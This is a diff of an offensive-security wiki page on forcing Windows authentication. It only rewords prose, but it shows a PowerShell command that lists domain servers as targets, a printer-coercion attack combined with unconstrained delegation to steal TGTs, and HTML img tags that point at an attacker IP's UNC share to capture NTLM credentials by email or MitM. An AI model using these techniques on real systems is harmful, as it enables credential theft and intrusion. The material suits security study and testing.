@@ -16,7 +16,7 @@ If you are looking for **RCE/LPE** in the spooler itself, check [PrintNightmare]
 
 ### Finding Windows Servers on the domain
 
-Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
+Use PowerShell to list Windows hosts. Servers are usually the highest-priority targets, so focus on them first:
 
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
@@ -90,7 +90,7 @@ This is especially useful when chaining with **`ntlmrelayx --adcs`** or other HT
 
 ### Combining with Unconstrained Delegation
 
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
+If an attacker has compromised a computer configured for [Unconstrained Delegation](unconstrained-delegation.md), they can **coerce the printer to authenticate to that computer**. The printer computer account's **TGT** is then cached in memory on the unconstrained-delegation host, where the attacker can retrieve and reuse it with [Pass the Ticket](pass-the-ticket.md).
 
 ## RPC Force authentication
 
@@ -191,11 +191,11 @@ If you know the **email address** of the user that logs inside a machine you wan
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
 
-and when he opens it, he will try to authenticate.
+When the victim opens it, Windows attempts to authenticate.
 
 ### MitM
 
-If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:
+If you can perform a MitM attack and inject HTML into a page viewed by the victim, try injecting an image such as:
 
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
